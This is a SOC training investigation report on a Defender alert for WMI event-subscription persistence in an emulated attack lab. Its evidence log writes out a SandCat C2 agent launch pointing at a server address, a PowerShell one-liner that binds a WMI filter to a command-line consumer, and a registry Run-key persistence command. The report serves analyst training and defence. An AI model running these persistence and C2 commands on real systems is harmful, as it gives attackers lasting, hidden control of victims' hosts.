# 🔍 Alert Investigation Report

> **Platform:** SOC Simulation Project — WDLabs  
> **Environment:** Microsoft Defender for Endpoint / Microsoft Sentinel

---

## 📋 Case Details

| Field | Value |
|---|---|
| **Alert Name** | A WMI event filter was bound to a suspicious event consumer|
| **Alert ID / Link** | da8a372ba2-2bee-4853-9282-8439d3256c54_1 / https://security.microsoft.com/alerts/da8a372ba2-2bee-4853-9282-8439d3256c54_1?tid=567ea528-4e82-40fa-914e-38c05fd69677|
| **Analyst** | Ezekiel Ni|
| **Date Investigated** | 30/05/2026|
| **Severity** | `High`|

---

## 1. Alert Summary

- **Host / Account affected:**
Host: ec2amaz-9oh9aqq
Account: NT AUTHORITY\SYSTEM
- **Date & Time of alert:**
May 29, 2026 9:03:37 AM
- **What triggered the alert:**
The alert was triggered by behavioural detection of an unauthorised WMI (Windows Management Instrumentation) Event Subscription. The detection logic flagged the suspicious orchestration of this event via powershell.exe, initiated by wusvc.exe (Windows Update service). The specific trigger was the invocation of Set-WmiInstance to bind an __EventFilter to a CommandLineEventConsumer, a tactic used to establish persistence that circumvents standard file-based security controls. 
- **Why it triggered (rule/logic):**
The platform is configured to monitor for anomalous modifications to the ROOT\subscription WMI namespace. It explicitly flagged the execution of Set-WmiInstance by a non-administrative service process (wusvc.exe), which matches known ATT&CK Tactic T1546.003 (Event Triggered Execution: WMI Event Subscription). The logic identifies the binding of an __EventFilter to a CommandLineEventConsumer as a high-fidelity indicator of persistent, file execution, as this combination is rarely used for legitimate system administration. 

---

## 2. Investigation Findings

### What happened?
<!-- How was the activity executed or triggered? Walk through the technical detail. -->
The activity was executed through a multi-stage process designed to establish persistent, fileless access on the endpoint EC2AMAZ-90H9AQQ. 
     1. Service Exploitation: The threat actor utilised nssm.exe to manipulate the wusvc.exe (Windows Update) service, using it as a proxy to execute commands under the context of NT AUTHORITY\SYSTEM. 
     2. Persistence Injection: The compromised service spawned powershell.exe [PID: 5816] to execute a malicious script that interacted directly with the WMI repository (ROOT\subscription).
     3. WMI Subscription Binding: The PowerShell script utilised Set-WmiInstance to create three specific WMI objects:
          - __EventFilter: Configured with a WQL query to trigger the malicious action based on specific system timing (TargetInstance ISA 'Win32_LocalTime').
          - CommandLineEventConsumer: Configured to execute a command that writes logs to C:\Windows\Temp\bits_svc.log, demonstrating the capability to run arbitrary commands.
          - __FilterToConsumerBinding: Successfully bound the filter to the consumer, completing the persistence mechanism. This ensures the malicious command executes automatically whenever the filter condition is met, without the need for a persistent file on disk. 

### Evidence
<!-- What artefacts, log entries, or indicators support your conclusion? -->

```
// Paste key log entries, process trees, or notable findings here
// Process Tree Chain
[5440] nssm.exe
     -> "wusvc.exe" -server http://172.31.2.203:8888 -group red
          -> [2612] wusvc.exe loaded image wusvc.exe
          -> Defender detected active 'Trojan:Win64/SandCat.RTS!MTB' in process 'wusvc.exe'
          -> wusvc.exe interacted with file wusvc.exe
          -> [5816] powershell.exe -ExecutionPolicy Bypass -C "$filter = Set-WmiInstance -Class __EventFilter -NameSpace \"root\subscription\" -Arguments @{Name=\"BITSJobFilter\"; EventNameSpace=\"root\cimv2\"; QueryLanguage=\"WQL\"; Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hours=7 AND TargetInstance.Minutes=0\"}; $consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace \"root\subscription\" -Arguments @{Name=\"BITSJobConsumer\"; CommandLineTemplate=\"cmd /c echo %DATE% %TIME% >> C:\Windows\Temp\bits_svc.log\"}; Set-WmiInstance -Class __FilterToConsumerBinding -Namespace \"root\subscription\" -Arguments @{Filter=$filter; Consumer=$consumer} | Out-Null; Write-Output \"WMI subscription installed: BITSJobFilter -> BITSJobConsumer\""
               -> powershell.exe executed a script: $filter = Set-WmiInstance -Class __EventFilter -NameSpace "root\subscription" -Arguments @{Name="BITSJobFilter"; EventNameSpace="root\cimv2"; QueryLanguage="WQL"; Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hours=7 AND TargetInstance.Minutes=0"}; $consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{Name="BITSJobConsumer"; CommandLineTemplate="cmd /c echo %DATE% %TIME% >> C:\Windows\Temp\bits_svc.log"}; Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{Filter=$filter; Consumer=$consumer} | Out-Null; Write-Output "WMI subscription installed: BITSJobFilter -> BITSJobConsumer"

               -> powershell.exe executed a script: 
               __EventFilter.GetObject();
               __EventFilter.GetObject();
               SetPropValue.Query("SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hours=7 AND TargetInstance.Minutes=0");
               SetPropValue.QueryLanguage("WQL");
               SetPropValue.Name("BITSJobFilter");
               SetPropValue.EventNameSpace("root\cimv2");
               CommandLineEventConsumer.GetObject();
               CommandLineEventConsumer.GetObject();
               SetPropValue.CommandLineTemplate("cmd /c echo %DATE% %TIME% >> C:\Windows\Temp\bits_svc.log");

               -> powershell.exe executed a script:
               __EventFilter.GetObject();
               __EventFilter.GetObject();
               SetPropValue.Query("SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hours=7 AND TargetInstance.Minutes=0");
               SetPropValue.QueryLanguage("WQL");
               SetPropValue.Name("BITSJobFilter");
               SetPropValue.EventNameSpace("root\cimv2");
               CommandLineEventConsumer.GetObject();
               CommandLineEventConsumer.GetObject();
               SetPropValue.CommandLineTemplate("cmd /c echo %DATE% %TIME% >> C:\Windows\Temp\bits_svc.log");
               SetPropValue.Name("BITSJobConsumer");
               __FilterToConsumerBinding.GetObject();
               __FilterToConsumerBinding.GetObject();
               SetPropValue.Consumer("");

          -> [6188] powershell.exe -ExecutionPolicy Bypass -C "Set-ItemProperty -Path \"HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\" -Name \"WindowsUpdateHelper\" -Value \"C:\Users\Public\wusvc.exe -silent\" -Force"
               -> powershell.exe executed a script: Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdateHelper" -Value "C:\Users\Public\wusvc.exe -silent" -Force

// Key Malicious Indicators (IOCs)
- WMI Namespace: root\subscription
- Event Filter Name: BITSJobFilter
- Event Consumer Name: BITSJobConsumer
- Command Line Argument (Consumer): cmd /c echo %DATE% %TIME% >> C:\Windows\Temp\bits_svc.log

// Script Content Hash (SHA256)
- 464158844edb3ea7f1f13ee49ce7c50231c6570600ab0ba302278f33ee53dd4d

The observed persistence mechanisms (WMI Event Subscription and Registry Run Key) represent a multi-layered attempt to maintain system access, confirming the threat actor’s intent for long-term presence on the endpoint.
```

### Was the activity successful?
- [x] Yes
- [ ] No
- [ ] Unknown

### Verdict
- [x] **Malicious**
- [ ] **Non-malicious**
- [ ] **Suspicious — requires further investigation**

**Justification:**
<!-- Why did you reach this conclusion? Be specific. -->
This event is classified as Malicious based on the correlation between high-confidence malware detections (Trojan:Win64/SandCat.RTS!MTB) and the subsequent execution of unauthorised persistence techniques on the endpoint. The threat actor leveraged a compromised Windows Update service (wusvc.exe) to execute PowerShell commands that modified the WMI repository (ROOT\subscription). Specifically, the creation of a __FilterToConsumerBinding linking an __EventFilter to a CommandLineEventConsumer is a well-documented tactic for establishing fileless, persistent execution (MITRE ATT&CK T1546.003). The presence of secondary persistence mechanisms, specifically a Registry 'Run' key, further confirms the adversary's intent to maintain long-term, resilient access to the host. This activity is entirely inconsistent with legitimate administrative operations and aligns with known patterns of adversary behaviour aimed at subverting file-based security controls. 
---

## 3. Investigation Steps

<!-- Walk through your process in order. What did you look at first? What led you to each pivot? -->

1. Initial Alert Review: Reviewed the triggered alert regarding suspicious PowerShell execution and cross-referenced it with preceding alerts on the same host, specifically the detection of SandCat malware in wusvc.exe. 
2. Process Tree Analysis: Examined the process execution chain, identifying nssm.exe as the parent process spawning the malicious wusvc.exe service, which subsequently initiated the PowerShell-based WMI persistence commands. 
3. Persistence Artifact Hunting: Investigated the PowerShell script arguments to confirm the creation of a __EventFilter, CommandLineEventConsumer, and the corresponding __FilterToConsumerBinding within the ROOT\subscription WMI namespace. 
4. Evidence Synthesis: Compiled key process identifiers, command-line arguments, and malware detection events to confirm the threat actor's intent for fileless, resilient persistence and elevated system access. 

### Queries Used

```kql
// Paste queries here
```
No manual KQL queries were required for this investigation; Analysis was performed via EDR process tree and alert telemetry. 
---

## 4. Categorisation

- [x] ✅ **True Positive** — malicious activity confirmed
- [ ] ⚠️ **Benign True Positive** — alert fired correctly, activity is legitimate
- [ ] ❌ **False Positive** — alert fired incorrectly, rule needs review
1. The security tool (EDR) correctly identified suspicious, non-standard behaviour (WMI event/persistence) that was a security threat. 
2. The activity was a deliberate attempt by an attacker to establish unauthorised persistence. 
3. The alert rule is working exactly as intended, to discover a malicious activity. 

---

## 5. Recommended Actions

**Escalation:**
- [x] Urgent — phone call required
- [ ] Non-urgent — email sufficient
- [ ] No escalation required
1. When a host is confirmed to be running malware (SandCat) and has successfully established persistence (WMI and Registry), every minute the machine remains connected to the network is a minute the attacker has to potentially pivot, exfiltrate data, or deploy secondary payloads. 
2. Immediate Containment: An urgent phone call ensures a responder is alerted immediately to isolate the host and prevent the threat from spreading. This is the standard operational procedure in a SOC. 

**Containment / Next Steps:**
<!-- What should happen next? Free text — don't limit yourself to a checklist. -->
Given the confirmation of active SandCat malware and multi-layered persistence, the following actions must be prioritised:
- Immediate Isolation: The host EC2AMAZ-90H9AQQ must be isolated from the network to prevent lateral movement and C2 communication. 
- Volatile Data Capture: Before re-imaging, ensure that memory dumps and relevant system logs are captured for deeper forensic analysis to identify potential credential harvesting impacts. 
- Account Review: Audit the service account or administrative credentials used by the nssm.exe process, as these are highly likely to have been compromised. 
- Infrastructure Hardening: Following the host re-image, initiate a review of the WMI event subscription logs across the environment to ensure this persistence technique has not been utilised on other endpoints. 
- Threat Intel Update: Use the artifacts recovered (the C2 IP address and the WMI script structure) to update internal blocklists and enhance detection rules to prevent further re-infection. 

**Alert Tuning:**
- [x] Tune recommended —
- [ ] No tuning required

---

## 6. Lessons Learned

<!-- What would you do differently? Where did you go wrong or take a longer path than needed?
     This is the most valuable part of the write-up for your own growth and for anyone reading your portfolio. -->
- Holistic Alert Correlation: Initially, I focused strictly on the PowerShell alert. I learned that taking a broader look at the process tree and existing malware detections (SandCat Trojan) earlier in the investigation provides immediate context that significantly speeds up the analysis. 
- Artifact Prioritisation: I spent time debating the value of script hashes for this fileless attack. I learned that for dynamic or polymorphic payloads, focusing on the command structure (e.g. the WMI binding technique) is a much more stable and effective way to identify and block the adversary than relying on changing hashes.
- Proactive Hunting: This investigation highlighted how adversaries often "stack" persistence methods (Registry Run Keys + WMI). In future investigations, if I identify one persistence mechanism, I will proactively search for secondary, hidden persistence techniques elsewhere on the host to ensure a more thorough eradication. 
---

<details>
<summary>📚 About this template</summary>

This investigation template is from the **[SOC Simulation Project](https://www.skool.com/socsim/about)** by WDLabs / WebDefend Cyber Security — a hands-on training environment giving aspiring analysts access to Microsoft Defender for Endpoint and Microsoft Sentinel to investigate real alerts generated by emulated threat actor TTPs.

</details>
